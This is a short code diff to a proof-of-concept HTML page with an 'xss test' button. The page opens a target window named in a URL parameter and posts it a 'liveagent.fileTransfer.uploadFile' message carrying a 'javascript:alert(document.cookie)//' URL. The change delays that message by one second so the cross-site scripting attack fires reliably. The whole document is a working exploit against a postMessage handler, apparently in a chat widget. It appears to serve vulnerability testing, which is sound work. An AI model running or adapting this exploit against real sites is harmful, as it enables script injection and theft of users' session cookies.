@@ -29,13 +29,18 @@
 			const fireEvent = () => {
 				var child = window.open(new URLSearchParams(location.search).get('target'));
 
-				child.postMessage(
-					{
-						method: 'liveagent.fileTransfer.uploadFile', 
-						data: {
-				     		url: 'javascript:alert(document.cookie)//'
-					}
-				}, '*');
+				window.setTimeout(
+					() => {
+						child.postMessage(
+							{
+								method: 'liveagent.fileTransfer.uploadFile', 
+								data: {
+								url: 'javascript:alert(document.cookie)//'
+							}
+						}, '*');
+					},
+					1000
+				);
 			};
 		</script>
 		<button id="xssTest" onclick="fireEvent()">xss test</button>
